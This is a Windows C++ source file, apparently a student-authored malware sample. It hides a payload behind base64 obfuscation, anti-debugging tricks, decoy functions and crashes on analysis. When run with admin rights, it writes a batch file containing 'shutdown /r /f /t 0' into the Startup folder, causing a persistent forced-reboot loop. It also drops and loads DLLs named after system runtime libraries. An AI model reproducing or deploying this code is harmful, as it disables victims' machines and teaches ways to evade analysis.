/*Authored by: Siddha Mehta, Samarth Devkar, Harsh Jannawar, Shlok Kshirsagar*/

#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <ShlObj.h>
#include <cstdlib> 
#include <vector>
#include <TlHelp32.h>
#define NOMINMAX
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


bool isDebuggerAttached() {
    // Check with IsDebuggerPresent (basic method)
    if (IsDebuggerPresent()) {
        __asm { int 3 } // Trigger breakpoint if debugger is present
        return true;
    }

    // Check with CheckRemoteDebuggerPresent
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    if (debuggerPresent) {
        return true;
    }

    // Check for debugging flags using NtQueryInformationProcess
    typedef NTSTATUS(WINAPI* NtQueryInfoProc)(
        HANDLE, UINT, PVOID, ULONG, PULONG);
    NtQueryInfoProc NtQueryInformationProcess =
        (NtQueryInfoProc)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    if (NtQueryInformationProcess) {
        ULONG debugPort = 0;
        NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
        if (NT_SUCCESS(status) && debugPort != 0) {
            return true;
        }

        ULONG debugFlags = 0;
        status = NtQueryInformationProcess(GetCurrentProcess(), 31, &debugFlags, sizeof(debugFlags), NULL);
        if (NT_SUCCESS(status) && debugFlags == 0) {
            return true;
        }
    }

    // No debugger detected
    return false;
}

// Crash program on debugger detection
void crashProgram() {
    volatile int* nullPointer = nullptr;
    *nullPointer = 42; // Access violation
}

// Look for common debugger-related artifacts (window names)
bool detectDebuggerArtifacts() {
    const std::vector<std::wstring> debuggerNames = {
        L"IDA", L"OllyDbg", L"x64dbg", L"WinDbg"
    };

    HWND windowHandle = GetForegroundWindow();
    if (windowHandle) {
        wchar_t windowTitle[256] = { 0 };
        GetWindowText(windowHandle, windowTitle, 256);

        for (const auto& name : debuggerNames) {
            if (std::wstring(windowTitle).find(name) != std::wstring::npos) {
                return true;
            }
        }
    }

    return false;
}

void checkApiHooks() {
    // Detect API hooks by verifying function pointers
    FARPROC realCreateFile = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateFileW");
    if (realCreateFile && reinterpret_cast<void*>(realCreateFile) != CreateFileW) {
        std::cerr << "API hook detected on CreateFileW!" << std::endl;
        crashProgram();
    }
}

// Custom Base64 Decoding (Unchanged)
std::string base64Decode(const std::string& input) {
    const std::string base64Chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64Chars[i]] = i;

    std::string output;
    int val = 0, valb = -8;
    for (unsigned char c : input) {
        if (c == '=') break;
        if (T[c] == -1) throw std::runtime_error("Invalid");

        val = (val << 6) | T[c];
        valb += 6;
        if (valb >= 0) {
            output.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }

    return output;
}

// Fake Functions (Dummy calls to mislead reverse engineers)
void fakeCall1() {
    std::cout << "Performing system diagnostics..." << std::endl;
}

void fakeCall2() {
    std::cout << "Starting network analysis module..." << std::endl;
}

void fakeCall3() {
    std::cout << "Running malware scanner..." << std::endl;
}

bool isAdmin() {
    BOOL isElevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return isElevated;
}

// Main Functionality
void createBatchFile() {
    // Custom Base64 Encoded Variables
    std::string encodedFileName = "Y29ja3RhaWwuYmF0"; // Base64: cocktail.bat
    std::string encodedCommand = "c2h1dGRvd24gL3IgL2YgL3QgMA=="; // Base64: shutdown /r /f /t 0
    std::string startupPath;
    std::string fakename = "Y2FuJ3QgZG8gaXQ/";
    std::string fakename1 = "Zm91bmRpdCE=";


    char startupPathBuffer[MAX_PATH];
    HRESULT result = SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPathBuffer);

    if (result != S_OK) {
        return;
    }
    startupPath = std::string(startupPathBuffer);

    // Decode obfuscated variables
    std::string fileName = base64Decode(encodedFileName);
    std::string restartCommand = base64Decode(encodedCommand);

    // Create batch file in the startup directory
    std::string batchFilePath = startupPath + "\\" + fileName;
    std::ofstream batchFile(batchFilePath);
    if (batchFile.is_open()) {
        batchFile << restartCommand;
        batchFile.close();
    }
    else {
        DWORD error = GetLastError();
        //std::cerr << "Windows Error Code: " << error << std::endl;

        return;
    }
}
void extractDLL(const wchar_t* resourceName, const wchar_t* outputFileName) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hRes = FindResource(hModule, resourceName, RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(hModule, hRes);
    DWORD size = SizeofResource(hModule, hRes);
    void* data = LockResource(hData);

    std::ofstream outFile(outputFileName, std::ios::binary);
    outFile.write(reinterpret_cast<const char*>(data), size);
    outFile.close();
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    extractDLL(L"DLL12", L"MSVCP140.dll");
    extractDLL(L"DLL23", L"VCRUNTIME140.dll");

    // Load the DLLs dynamically if needed
    LoadLibrary(L"MSVCP140.dll");
    LoadLibrary(L"VCRUNTIME140.dll");

    if (!isAdmin()) {
        return 1;
    }

    //std::cout << "Creating batch script to restart computer..." << std::endl;

    // Perform enhanced anti-debugging checks
    if (isDebuggerAttached() || detectDebuggerArtifacts()) {
        crashProgram();
    }
    checkApiHooks();

    //// Add fake function calls
    if (rand() % 2 == 0) fakeCall1();
    if (rand() % 2 == 0) fakeCall2();
    if (rand() % 3 == 0) fakeCall3();

    createBatchFile();

    return 0;
}